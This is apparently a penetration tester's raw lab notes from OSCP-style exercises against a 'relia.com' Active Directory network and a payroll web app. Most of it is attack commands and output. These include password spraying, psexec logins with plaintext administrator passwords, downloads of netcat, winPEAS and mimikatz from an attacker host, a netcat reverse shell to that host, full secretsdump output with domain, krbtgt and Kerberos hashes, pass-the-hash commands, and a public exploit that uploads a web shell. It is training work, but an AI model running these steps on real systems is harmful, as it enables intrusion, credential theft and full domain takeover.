FGwfnRHFBFO/S4/DKysm0lI=
=t7+s
-----END PGP SIGNATURE-----

>sshpass -p "DRtajyCwcbWvH/9" ssh mountuser@172.16.10.21

#Tried  - Try manually with smb Make sure to specify the domain name while connecting to the target
crackmapexec rdp 172.16.173.21 -u mountuser -p 'DRtajyCwcbWvH/9' -d relia.com  --continue-on-success\n
nxc smb 172.16.173.21 -u mountuser -p 'DRtajyCwcbWvH/9' -d relia.com  --continue-on-success\n
smbclient -L //192.168.221.189 -U 'mountuser'
smbclient -L //192.168.221.189 -U mountuser/files
smbclient -L //172.16.173.21 -U mountuser%DRtajyCwcbWvH/9
smbclient -L //172.16.173.21 -U mountuser
smbclient -L //172.16.173.21 -U mountuser/files
smbmap -H 172.16.173.21 -u mountuser -p 'DRtajyCwcbWvH/9' 
smbmap -H 172.16.173.21 -u mountuser -p 'DRtajyCwcbWvH/9' -d FILES.RELIA.com
smbmap -H 172.16.173.21 -u mountuser -p 'DRtajyCwcbWvH/9' -d FILES.RELIA.COM
nxc smb 172.16.173.21 -u users.txt  -p 'DRtajyCwcbWvH/9' -d files  --continue-on-success\n
nxc smb 172.16.173.21 -u users.txt  -p 'DRtajyCwcbWvH/9' -d files.relia.com  --continue-on-success\n
nxc smb 172.16.173.21 -u mountuser -p 'DRtajyCwcbWvH/9' -d files.relia.com  --continue-on-success\n
nxc smb 172.16.173.21 -u mountuser -p 'DRtajyCwcbWvH/9' -d files  --continue-on-success\n
rpcclient 172.16.173.21
rpcclient 172.16.173.21 -U "mountuser"
rpcclient -U "mountuser" 172.16.173.21

Nothing hit error "STATUS_LOGON_FAILURE"

#Help - Use valid credentials
>smbmap -H 172.16.XXX.21 -d relia -u mountuser -p "DRtajyCwcbWvH/9"
>smbmap -H 172.16.173.21 -d relia -u mountuser -p "DRtajyCwcbWvH/9"
#Got shares
[+] IP: 172.16.173.21:445       Name: 172.16.173.21             Status: Authenticated
        Disk                                                    Permissions          Comment
        ----                                                    -----------    				 -------
        ADMIN$                                            NO ACCESS     		  Remote Admin
        apps                                                    READ ONLY
        C$                                                       NO ACCESS       		Default share
        IPC$                                                    READ ONLY       		Remote IPC
        monitoring                                      READ ONLY
        scripts                                                 READ ONLY
        
>smbclient //172.16.173.21/apps -U relia/mountuser%DRtajyCwcbWvH/9

>
#Creds
john.m-YouWillNeverTakeMyTractor!1922

Their are some credentials in 
PS C:\Users\Administrator> $spass = ConvertTo-SecureString "vau!XCKjNQBv2$" -AsPlaintext -Force
PS C:\Users\Administrator> $cred = New-Object System.Management.Automation.PSCredential("RELIA\Administrator", $spass)

>nxc smb 172.16.173.21 -u mountuser -p 'vau!XCKjNQBv2$' -d relia.com  --continue-on-success
>nxc smb 172.16.154.21 -u mountuser -p 'DRtajyCwcbWvH/9' -d relia.com  --shares #Listed the shares

>impacket-psexec relia/Administrator:'vau!XCKjNQBv2$'@172.16.173.21 # Got ADMIN Access

```

### Relia - 172.16.173.21

```jsx
impacket-psexec relia/Administrator:'vau!XCKjNQBv2$'@172.16.173.21
#Got Administrator access

#Doamin joined or not 
>systeminfo | findstr /B /C:"Domain"
>wmic computersystem get domain
>(Get-WmiObject Win32_ComputerSystem).Domain

>iwr -uri http://192.168.45.220:8000/nc.exe -Outfile nc.exe
>iwr -uri http://192.168.45.220:8000/winPEASx64.exe -OutFile winPEAS.exe
>iwr -uri http://192.168.45.220:8000/mimicatz.exe -Outfile mimicatz.exe
>.\nc.exe 192.168.45.220 1122 -e powershell

>netexec rdp /v:172.16.154.6 /d:relia.com /u:mountuser /P:'vau!XCKjNQBv2$' /cert:ignore
>crackmapexec rdp /v:172.16.154.6 /d:relia.com /u:mountuser /P:'vau!XCKjNQBv2$' /cert:ignore
>nxc rdp /v:172.16.154.6 /d:relia.com /u:mountuser /P:'vau!XCKjNQBv2$' /cert:ignore
>hydra -L users.txt -P pass.txt 172.16.154.19 rdp # No hit

>└─$ crackmapexec smb 172.16.154.6 -d relia.com -u Administrator -p 'vau!XCKjNQBv2$' /cert:ignore  
SMB         172.16.154.6    445    DC02             [*] Windows Server 2022 Build 20348 x64 (name:DC02) (domain:relia.com) (signing:True) (SMBv1:False)
SMB         172.16.154.6    445    DC02             [+] relia.com\Administrator:vau!XCKjNQBv2$ (Pwn3d!)
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/HTB/OSCP/Relia]
└─$ crackmapexec smb 172.16.154.30 -d relia.com -u Administrator -p 'vau!XCKjNQBv2$' /cert:ignore 
SMB         172.16.154.30   445    WEBBY            [*] Windows Server 2022 Build 20348 x64 (name:WEBBY) (domain:relia.com) (signing:False) (SMBv1:False)
SMB         172.16.154.30   445    WEBBY            [+] relia.com\Administrator:vau!XCKjNQBv2$ (Pwn3d!)

```

### Relia - 172.16.154.6

```jsx
>impacket-psexec relia/Administrator:'vau!XCKjNQBv2$'@172.16.173.6

#Doamin joined or not 
>systeminfo | findstr /B /C:"Domain"
>wmic computersystem get domain
>(Get-WmiObject Win32_ComputerSystem).Domain

>iwr -uri http://192.168.45.220:8000/nc.exe -Outfile nc.exe
>iwr -uri http://192.168.45.220:8000/winPEASx64.exe -OutFile winPEAS.exe
>iwr -uri http://192.168.45.220:8000/mimicatz.exe -Outfile mimicatz.exe
>.\nc.exe 192.168.45.220 1122 -e powershell

smbclient //172.16.154.6/SYSVOL -U relia/administrator%'vau!XCKjNQBv2$'

#NetNTLMv2
 Version: NetNTLMv2
  Hash:    DC02$::RELIA:1122334455667788:78a7301b094642cef9689362aea42e80:0101000000000000f251e0902d09db0139e5e2ecc43e3bc500000000080030003000000000000000000000000040000078b4a5a460630e6edd365a3ed87af2d55cdb7fee7b3d6bd8a277b73b12df245b0a00100000000000000000000000000000000000090000000000000000000000
  
  
  >evil-winrm -i relia/172.16.154.30 -u Administrator -p 'vau!XCKjNQBv2$'
  >impacket-psexec relia.com/Administrator:'vau!XCKjNQBv2$'@172.16.154.30  # Hit
```

### Relia - 172.16.154.30 - impacket-secretsdump with admini privileges

```jsx
>impacket-psexec relia.com/Administrator:'vau!XCKjNQBv2$'@172.16.154.30  
#Got Admin Access

>iwr -uri http://192.168.45.220:8000/nc.exe -Outfile nc.exe
>iwr -uri http://192.168.45.220:8000/winPEASx64.exe -OutFile winPEAS.exe
>iwr -uri http://192.168.45.220:8000/mimicatz.exe -Outfile mimicatz.exe
>.\nc.exe 192.168.45.220 1122 -e powershell

>impacket-secretsdump relia/administrator:'vau!XCKjNQBv2$'@172.16.172.30
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0xd064fb8c49257c6a6477afe192e5b75d
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:c6290d630dfc5e4ebce170090be7e0cf:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:e0ace20a027ab482a0e0c42ce61fd2d4:::
[*] Dumping cached domain logon information (domain/username:hash)
RELIA.COM/anna:$DCC2$10240#anna#8b28f656be3a82cd33c26262155a3cba: (2022-10-20 13:11:08)
RELIA.COM/Administrator:$DCC2$10240#Administrator#8d0b95a7748459ac911dc767ee3fd4b2: (2022-10-20 14:10:58)
RELIA.COM/michelle:$DCC2$10240#michelle#758c1665fd06bf2ac8a633a959794f4f: (2022-10-27 09:07:32)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
RELIA\WEBBY$:aes256-cts-hmac-sha1-96:79df289191ad98441d036286ce368f0613e2993389884bcd0ab9406ac8130cc0
RELIA\WEBBY$:aes128-cts-hmac-sha1-96:a26f05c131098a183840dc3b92feae7d
RELIA\WEBBY$:des-cbc-md5:c257794040467a04
RELIA\WEBBY$:plain_password_hex:c7f98cb8fb317623ad17c8f8454ebacf80888ddee5372679b2b3cdca1e00e0cb857a4154891eff9bba4e8887d301eeecfa6af35c06c411a0ed77e440342c042faa58850ece579b7c097da3cb952dd46d65ed27da473652d046ebbbe83af682d25ca92f8be06a1075687527bb7a7bb05b53a6cdcae93467258e751aae8724f2cdc877b257c24fa4b22bececa0a00a9d182a8b05814dcb851fa9ca234dab4aa4334517dd158c5428ab8d826f5179370e232998e7359ff25e9ebf7117d9d971bfc3f957b841a59c9197c8e8b6d536b7ea4e31afba514f78b7d64bfc472c4c40ae29f3c8f4106aa4b92e264c9ae4c3ae1aa2
RELIA\WEBBY$:aad3b435b51404eeaad3b435b51404ee:5c0c47cd72af3d4b489ccc654598e4c8:::
[*] DPAPI_SYSTEM 
dpapi_machinekey:0xe35476bb28010f5347d3706714000de107f0d9eb
dpapi_userkey:0x1d8f63f460e27c44dee0039cc9802e9c46fa98fe
[*] NL$KM 
 0000   22 D9 0C AD BC 8E 2B 5B  95 AF AB 05 53 A2 60 01   ".....+[....S.`.
 0010   53 E8 B4 08 05 04 21 8C  21 B5 5C EF FA 96 90 87   S.....!.!.\.....
 0020   68 64 7E 65 4B 1E B2 80  08 D4 D8 DD 59 62 BF 43   hd~eK.......Yb.C
 0030   B4 86 43 B9 CC 75 3E B4  19 2D CC 2F 72 DB 66 CC   ..C..u>..-./r.f.
NL$KM:22d90cadbc8e2b5b95afab0553a2600153e8b4080504218c21b55ceffa96908768647e654b1eb28008d4d8dd5962bf43b48643b9cc753eb4192dcc2f72db66cc
[*] Cleaning up... 
[*] Stopping service RemoteRegistry

```

### Relia - 192.168.212.189

```jsx
#Hit
>impacket-secretsdump relia/administrator:'vau!XCKjNQBv2$'@172.16.172.30
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0xd064fb8c49257c6a6477afe192e5b75d
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:c6290d630dfc5e4ebce170090be7e0cf:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:e0ace20a027ab482a0e0c42ce61fd2d4:::
[*] Dumping cached domain logon information (domain/username:hash)
RELIA.COM/anna:$DCC2$10240#anna#8b28f656be3a82cd33c26262155a3cba: (2022-10-20 13:11:08)
RELIA.COM/Administrator:$DCC2$10240#Administrator#8d0b95a7748459ac911dc767ee3fd4b2: (2022-10-20 14:10:58)
RELIA.COM/michelle:$DCC2$10240#michelle#758c1665fd06bf2ac8a633a959794f4f: (2022-10-27 09:07:32)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
RELIA\WEBBY$:aes256-cts-hmac-sha1-96:79df289191ad98441d036286ce368f0613e2993389884bcd0ab9406ac8130cc0
RELIA\WEBBY$:aes128-cts-hmac-sha1-96:a26f05c131098a183840dc3b92feae7d
RELIA\WEBBY$:des-cbc-md5:c257794040467a04
RELIA\WEBBY$:plain_password_hex:c7f98cb8fb317623ad17c8f8454ebacf80888ddee5372679b2b3cdca1e00e0cb857a4154891eff9bba4e8887d301eeecfa6af35c06c411a0ed77e440342c042faa58850ece579b7c097da3cb952dd46d65ed27da473652d046ebbbe83af682d25ca92f8be06a1075687527bb7a7bb05b53a6cdcae93467258e751aae8724f2cdc877b257c24fa4b22bececa0a00a9d182a8b05814dcb851fa9ca234dab4aa4334517dd158c5428ab8d826f5179370e232998e7359ff25e9ebf7117d9d971bfc3f957b841a59c9197c8e8b6d536b7ea4e31afba514f78b7d64bfc472c4c40ae29f3c8f4106aa4b92e264c9ae4c3ae1aa2
RELIA\WEBBY$:aad3b435b51404eeaad3b435b51404ee:5c0c47cd72af3d4b489ccc654598e4c8:::
[*] DPAPI_SYSTEM 
dpapi_machinekey:0xe35476bb28010f5347d3706714000de107f0d9eb
dpapi_userkey:0x1d8f63f460e27c44dee0039cc9802e9c46fa98fe
[*] NL$KM 
 0000   22 D9 0C AD BC 8E 2B 5B  95 AF AB 05 53 A2 60 01   ".....+[....S.`.
 0010   53 E8 B4 08 05 04 21 8C  21 B5 5C EF FA 96 90 87   S.....!.!.\.....
 0020   68 64 7E 65 4B 1E B2 80  08 D4 D8 DD 59 62 BF 43   hd~eK.......Yb.C
 0030   B4 86 43 B9 CC 75 3E B4  19 2D CC 2F 72 DB 66 CC   ..C..u>..-./r.f.
NL$KM:22d90cadbc8e2b5b95afab0553a2600153e8b4080504218c21b55ceffa96908768647e654b1eb28008d4d8dd5962bf43b48643b9cc753eb4192dcc2f72db66cc
[*] Cleaning up... 
[*] Stopping service RemoteRegistry,

I tried with -------------------------
crackmapexec winrm 192.168.212.189 -d relia.com -u users.txt -p pass.txt  /cert:ignore 
WINRM       192.168.212.189 5985   192.168.212.189  [+] relia.com\Administrator:vau!XCKjNQBv2$ (Pwn3d!)

./psexec.py -hashes :758c1665fd06bf2ac8a633a959794f4f relia.com/michelle@192.168.212.189
./psexec.py -hashes :8d0b95a7748459ac911dc767ee3fd4b2 relia.com/administrator@192.168.212.189
./psexec.py -hashes :8b28f656be3a82cd33c26262155a3cba relia.com/anna@192.168.212.189 
./psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:c6290d630dfc5e4ebce170090be7e0cf relia.com/administrator@192.168.212.189

#Credentils from 172.16.172.6
impacket-secretsdump relia/administrator:"vau\!XCKjNQBv2$"@172.16.172.6 
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x5134f539f916174432bd178912ae1162
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:ec341e4a24f0f7db215b90f14f6e12b5:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
RELIA\DC02$:aes256-cts-hmac-sha1-96:a62c891f36a0a49cc7ea464cc6df3eeefb2d77b21bed5625721b57df3d6b698b
RELIA\DC02$:aes128-cts-hmac-sha1-96:44aa1293641441dfa1fd899f1183371c
RELIA\DC02$:des-cbc-md5:6badbc7c2ada0bd0
RELIA\DC02$:plain_password_hex:8b89bf929bf23b2bfd12acde2bee2f463d11b9d05582515f05a88ee54a594674b6e8ff2faa19fff2e5252c2327ffa94e476dde6c0eff012c0d179fb4600d83c0fe98e1c7bf81974899de7f6644505eb89c294db8cadf1a4375153d43c52713da449fa5a117e51c064a7699cdd19902205cbcd92d5c1e026188262392cfabdd74ea55ec06da7cbeb09650fb95fa52e4f43eb0915f9bc96091d7fb57e5a163157e7f0af4b3aa19f8e17eb5fc0e3b001242067344d93249e71aefe56599a6c7a53b5bce3ab1d94e1a88fe3dc9d396ce9c9c2777590e237e0c81360856b5eb70692400d1a9e77173fdda24b62012a4306a38
RELIA\DC02$:aad3b435b51404eeaad3b435b51404ee:ad687856aa97635eb57523211e66d602:::
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x389a45b7e84fa30fce73b9f921b7628d6430f2cd
dpapi_userkey:0x89b8e60e5b192f01d54ea880de4ccb2c419ae46c
[*] NL$KM 
 0000   5B A6 CD 9F CD 69 27 89  3B D2 4F 79 97 25 83 B3   [....i'.;.Oy.%..
 0010   81 22 32 BA 54 FA D2 4E  EB B0 54 10 42 F0 D7 06   ."2.T..N..T.B...
 0020   B7 9C E8 CE E4 82 7F 3A  91 E3 17 EF 1B 7E 26 79   .......:.....~&y
 0030   14 34 72 89 A6 AD 4B C1  BE 19 A1 03 D0 F0 59 AA   .4r...K.......Y.
NL$KM:5ba6cd9fcd6927893bd24f79972583b3812232ba54fad24eebb0541042f0d706b79ce8cee4827f3a91e317ef1b7e267914347289a6ad4bc1be19a103d0f059aa
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:60446f9e333abfda8c548cbe11daedc2:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:b896b5f9c769cd04d97008292674c1a5:::
relia.com\maildmz:1103:aad3b435b51404eeaad3b435b51404ee:ddbe308ff30d828d484098d1c75c6166:::
relia.com\jim:1104:aad3b435b51404eeaad3b435b51404ee:be5cb823ee026304b6ed0cd356e34a3c:::
relia.com\michelle:1105:aad3b435b51404eeaad3b435b51404ee:18d4098c8d9ff721745b388ad4a442bf:::
relia.com\andrea:1106:aad3b435b51404eeaad3b435b51404ee:ce3f12443651168b3793f5fbcccff9db:::
relia.com\mountuser:1107:aad3b435b51404eeaad3b435b51404ee:6a2f774420368de1567dea28ab0d3988:::
relia.com\iis_service:1108:aad3b435b51404eeaad3b435b51404ee:bb4136aaa06fe1688b300e2f9243e85b:::
relia.com\internaladmin:1109:aad3b435b51404eeaad3b435b51404ee:65a883e27cc4714738dfe4dce95001db:::
relia.com\larry:1110:aad3b435b51404eeaad3b435b51404ee:47995d3e82d8e698f9b1a9d78c90aa7e:::
relia.com\jenny:1111:aad3b435b51404eeaad3b435b51404ee:5ef6ddc308ac24d5423c0b983eee159c:::
relia.com\brad:1113:aad3b435b51404eeaad3b435b51404ee:970ba7d4c92f712d0363706d6144c058:::
relia.com\anna:1114:aad3b435b51404eeaad3b435b51404ee:f79bec80e693e632f973d32b3489af18:::
relia.com\dan:1123:aad3b435b51404eeaad3b435b51404ee:4b22394fc907bd7a74d1af6cc9aca348:::
relia.com\milana:1124:aad3b435b51404eeaad3b435b51404ee:2237ff5905ec2fd9ebbdfa3a14d1b2b6:::
DC02$:1000:aad3b435b51404eeaad3b435b51404ee:ad687856aa97635eb57523211e66d602:::
MAIL$:1119:aad3b435b51404eeaad3b435b51404ee:ceb5139fc570de96dc974dde1d6d56ae:::
LOGIN$:1120:aad3b435b51404eeaad3b435b51404ee:efd10e30dbfe86d7d249376cf459db5d:::
WK01$:1121:aad3b435b51404eeaad3b435b51404ee:619898246c55cf44a9a3121a3c90bd94:::
WK02$:1122:aad3b435b51404eeaad3b435b51404ee:093cd524e2b71ddf1e63aaa2fc563263:::
INTRANET$:1125:aad3b435b51404eeaad3b435b51404ee:31a107b55217b3627b94b37cd68e7240:::
FILES$:1126:aad3b435b51404eeaad3b435b51404ee:0690d90fec24925588714bf740b8e958:::
WEBBY$:1127:aad3b435b51404eeaad3b435b51404ee:5c0c47cd72af3d4b489ccc654598e4c8:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:16b60b6055364550c0389e45e800d5bd97faccd5e5fb933f65d0950e7f7354b4
Administrator:aes128-cts-hmac-sha1-96:702fe1f9ce3c6e2b49ade7653bfda410
Administrator:des-cbc-md5:0454b510c82915ae
krbtgt:aes256-cts-hmac-sha1-96:3c0c55e8a4912ffb410a35b867125a7b15868704f1e0b3365733d7402930069d
krbtgt:aes128-cts-hmac-sha1-96:c19d37e81b84ac5b2fe02b8e1219d1e7
krbtgt:des-cbc-md5:c8b6384613585db3
relia.com\maildmz:aes256-cts-hmac-sha1-96:cb7f0e43ecbb059fc42982f8cb5832f089b41e1a0c39927099d1a414858ae7f6
relia.com\maildmz:aes128-cts-hmac-sha1-96:fc99e971846d5ff69c2de3dcdb8cad52
relia.com\maildmz:des-cbc-md5:a7f12fec6ea4fdb3
relia.com\jim:aes256-cts-hmac-sha1-96:3543128af0d8da8ab5851239d21435cb000efac857aa5d8e155891a61d5536bc
relia.com\jim:aes128-cts-hmac-sha1-96:4b2d51926d0bbf3d9b4e3e9881614f56
relia.com\jim:des-cbc-md5:a7e98f5d54dff29e
relia.com\michelle:aes256-cts-hmac-sha1-96:ebd85af2e578051b14f5f4fbfabb00a3a9d9393bd8c448513b8d77d66905a37d
relia.com\michelle:aes128-cts-hmac-sha1-96:95112aa40707f02d48c57dcee1aa7d38
relia.com\michelle:des-cbc-md5:167a8c85b085382c
relia.com\andrea:aes256-cts-hmac-sha1-96:fefbc06e926a8c67df45efbfc02b550f6155f1fa485637bdabc0161cacda61cb
relia.com\andrea:aes128-cts-hmac-sha1-96:a7678b75357eeb4cd6e9d8b454bac8b7
relia.com\andrea:des-cbc-md5:9dd0fd3dec7a43d5
relia.com\mountuser:aes256-cts-hmac-sha1-96:7981485c2b4ea718c9b1540832233ba4a3dea6b892f1d71d726be350de8d6787
relia.com\mountuser:aes128-cts-hmac-sha1-96:c42b56f698f8febf2e4760aa5aefe6a0
relia.com\mountuser:des-cbc-md5:5b494f5e15167501
relia.com\iis_service:aes256-cts-hmac-sha1-96:467eade799b673e13aab9b105f74969df7cd5548fc96b93597e8562fec78ef2a
relia.com\iis_service:aes128-cts-hmac-sha1-96:7167de4e95f6c915bcee7c3a7ea4191a
relia.com\iis_service:des-cbc-md5:040ee0ce9801e6d6
relia.com\internaladmin:aes256-cts-hmac-sha1-96:2502e64b8eaea1258d93293a5ce87fd4ef3b0ae2bd3ce1e8b01119121ea1afaf
relia.com\internaladmin:aes128-cts-hmac-sha1-96:f1df762b209ec947f11daaad6fe3f11b
relia.com\internaladmin:des-cbc-md5:9e2c8afddffed55b
relia.com\larry:aes256-cts-hmac-sha1-96:bff53d9c1b4b2e050db3d778e50430323d6163ae9b147154e1432e5b5327b00f
relia.com\larry:aes128-cts-hmac-sha1-96:c98dd28e8f4d86c38d5d5b076a64886d
relia.com\larry:des-cbc-md5:bc7c1ff75d19ab19
relia.com\jenny:aes256-cts-hmac-sha1-96:f64c1fd34c4ca15b5de420aac51dd656951e2cb5fe0a539ad84690284ef43d7f
relia.com\jenny:aes128-cts-hmac-sha1-96:e054a5850c941019a7433b90c63a1ed9
relia.com\jenny:des-cbc-md5:fb13aed6fe98ba38
relia.com\brad:aes256-cts-hmac-sha1-96:67803389e653909cf70cc0392032877cf1d07d42827e7c6f5c2e1e8ff4ecb553
relia.com\brad:aes128-cts-hmac-sha1-96:f8fdbbfba24356563e12bf044a3b6bb4
relia.com\brad:des-cbc-md5:45265e08fbced0a8
relia.com\anna:aes256-cts-hmac-sha1-96:894923e65e97ed8627dcd80328613a1721440ef6f6faea6f6a58735969e052ab
relia.com\anna:aes128-cts-hmac-sha1-96:d5ce8f92ad8ec94fb6058039e3756560
relia.com\anna:des-cbc-md5:fe6e61349dcee57a
relia.com\dan:aes256-cts-hmac-sha1-96:f1f68e4fed320d4c21d599a8856ebc3f03faa53184ae6088b7a3f397554ef044
relia.com\dan:aes128-cts-hmac-sha1-96:2125bb415b56ff5035bd555b8defc79e
relia.com\dan:des-cbc-md5:941f34a8c4c7202c
relia.com\milana:aes256-cts-hmac-sha1-96:8ae66251b65eacff7929a77f56c1feedb7e6e4b5fc86f225e8256fd29acc0ad0
relia.com\milana:aes128-cts-hmac-sha1-96:8404b82bc7dc78e138accf7ddc8abd1c
relia.com\milana:des-cbc-md5:40dc076ed0469d85
DC02$:aes256-cts-hmac-sha1-96:a62c891f36a0a49cc7ea464cc6df3eeefb2d77b21bed5625721b57df3d6b698b
DC02$:aes128-cts-hmac-sha1-96:44aa1293641441dfa1fd899f1183371c
DC02$:des-cbc-md5:57d3688a64cde013
MAIL$:aes256-cts-hmac-sha1-96:0abf16a5eef255cb6f1e78ea5dca79b872696348d27ef09fba41ccbf4cb4dff3
MAIL$:aes128-cts-hmac-sha1-96:6b265fb361385b18d1f995cb3048dd94
MAIL$:des-cbc-md5:587985e0312a8f79
LOGIN$:aes256-cts-hmac-sha1-96:7c1c228379de9df5e284f18f27bfc35539c79fb79b9037ae50c99e0555d8841d
LOGIN$:aes128-cts-hmac-sha1-96:5be347dcd9a34ebe70073e2fb6312c8a
LOGIN$:des-cbc-md5:520e6210e6ad8ff4
WK01$:aes256-cts-hmac-sha1-96:e827069623914606d84e39493cee46cfdc6cb2a803bc9f62ca2599bfb6d7feee
WK01$:aes128-cts-hmac-sha1-96:5fba6809e426e4e6a3c8be78b8b433b1
WK01$:des-cbc-md5:eccb850bec8f0416
WK02$:aes256-cts-hmac-sha1-96:72b626b0250646a0899beaaf0bfa916a7ed11e2ed7356f03635750e228e0a3e7
WK02$:aes128-cts-hmac-sha1-96:659e38811e6e8e07a73e6cf080226199
WK02$:des-cbc-md5:07575d646864521c
INTRANET$:aes256-cts-hmac-sha1-96:10dbbd3285b152abd48beafc83187d2e2e97e086ed3837d51319435c0335012f
INTRANET$:aes128-cts-hmac-sha1-96:2563b8910dfa08c54e82c6a8ec69d1b9
INTRANET$:des-cbc-md5:abcd9e67d9084326
FILES$:aes256-cts-hmac-sha1-96:3ad7428823f48b0cf65cbbea79aa656ed20f8e6e5c22324a1ce3357548212131
FILES$:aes128-cts-hmac-sha1-96:3e445a3667a29d6b7c5913e1a3b8bc3a
FILES$:des-cbc-md5:402f31e6df7a5823
WEBBY$:aes256-cts-hmac-sha1-96:79df289191ad98441d036286ce368f0613e2993389884bcd0ab9406ac8130cc0
WEBBY$:aes128-cts-hmac-sha1-96:a26f05c131098a183840dc3b92feae7d
WEBBY$:des-cbc-md5:e97f57d0fee05710
[*] Cleaning up... 
[*] Stopping service RemoteRegistry
[-] SCMR SessionError: code: 0x41b - ERROR_DEPENDENT_SERVICES_RUNNING - A stop control has been sent to a service that other running services are dependent on.
[*] Cleaning up... 
[*] Stopping service RemoteRegistry

#Hit
./psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:65a883e27cc4714738dfe4dce95001db relia.com/internaladmin@192.168.212.189
./psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:4b22394fc907bd7a74d1af6cc9aca348 relia.com/dan@192.168.212.189

```

# OSCP A

### AD

with 2 internal networks

![image.png](image%202.png)

```jsx
     http://192.168.204.141/

# http://192.168.204.141 Their is website with kind of form but their is no backend functionality to send the data to the backend

- Captured in 2 forms  Burp their is no response, might be not connected to the backend
whatweb http://192.168.204.141        
http://192.168.204.141 [200 OK] Apache[2.4.51], Country[RESERVED][ZZ], HTML5, HTTPServer[Apache/2.4.51 (Win64) PHP/7.4.26], IP[192.168.204.141], JQuery, MetaGenerator[Nicepage 4.8.2, nicepage.com], Open-Graph-Protocol[website], PHP[7.4.26], Script[application/ld+json,text/javascript], Title[Home]
gobuster dir -u http://192.168.204.141 -w /usr/share/wordlists/dirb/big.txt
-Blog. Images, scripts

# http://192.168.204.141:81 Their is website with kind of form but their is no backend functionality to send the data to the backend
-Captured the request their is error with mysql
whatweb http://192.168.204.141:81
http://192.168.204.141:81 [200 OK] Apache[2.4.51], Bootstrap, Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Apache/2.4.51 (Win64) PHP/7.4.26], IP[192.168.204.141], JQuery, PHP[7.4.26], Script[text/javascript], Title[Attendance and Payroll System], X-Powered-By[PHP/7.4.26], X-UA-Compatible[IE=edge]
gobuster dir -u http://192.168.204.141 -w /usr/share/wordlists/dirb/big.txt
-ADMIN (Login page), DB(Some .sql file), build (Some Development data), dist, plugins, tcpdf
-apsystem.sql file has tables information 
INSERT INTO `admin` (`id`, `username`, `password`, `firstname`, `lastname`, `photo`, `created_on`) VALUES
(1, 'nurhodelta', '$2y$10$fCOiMky4n5hCJx3cpsG20Od4wHtlkCLKmO6VLobJNRIg9ooHTkgjK', 'Neovic', 'Devierte', 'facebook-profile-image.jpeg', '2018-04-30');
https://hashes.com/en/decrypt/hash - password
-mysql -h 192.168.204.141 -u 'nurhodelta' -p 'password' # No
- Tried login with admin, nurhodelta and remaining 3 users with first anme and lastname no hit

#SMB Enumeration
crackmapexec smb 192.168.204.141 -u '' -p ''  # reveled domain
>smbclient -L ////192.168.204.141 
>rpcclient -U ‘’ 192.168.204.141
>rpcclient -U "" -N 192.168.204.141
>smbclient -L ////192.168.204.141 -U nurhodelta
>enum4linux 192.168.204.141
>netexec smb 192.168.204.141 -d oscp.exam -u 'nurhodelta' -p 'password'
>nxc smb 192.168.204.141 -d oscp.exam -u 'nurhodelta' -p 'password'
>crackmapexec smb 192.168.204.141 -d oscp.exam -u 'nurhodelta' -p 'password'
Exploit
>evil-winrm -i oscp.exam/192.168.204.141 -u nurhodelta -p 'password'
>impacket-psexec oscp.exam/nurhodelta:password@192.168.212.189

#Searchsploit
searchsploit Attendance and Payroll System                
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                                                                                            |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Attendance and Payroll System v1.0 - Remote Code Execution (RCE)                                                                                                                                      | php/webapps/50801.py
Attendance and Payroll System v1.0 - SQLi Authentication Bypass                                                                                                                                           | php/webapps/50802.py
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

>python3 50801.py http://192.168.204.141:81/admin/index.php
    >> Attendance and Payroll System v1.0
    >> Unauthenticated Remote Code Execution
    >> By pr0z

[*] Uploading the web shell to http://192.168.204.141:81/admin/index.php
[*] Validating the shell has been uploaded to http://192.168.204.141:81/admin/index.php
[✓] Successfully connected to web shell

RCE > ls
#Nothing is working

>python3 50802.py http://192.168.204.141:81/admin/index.php
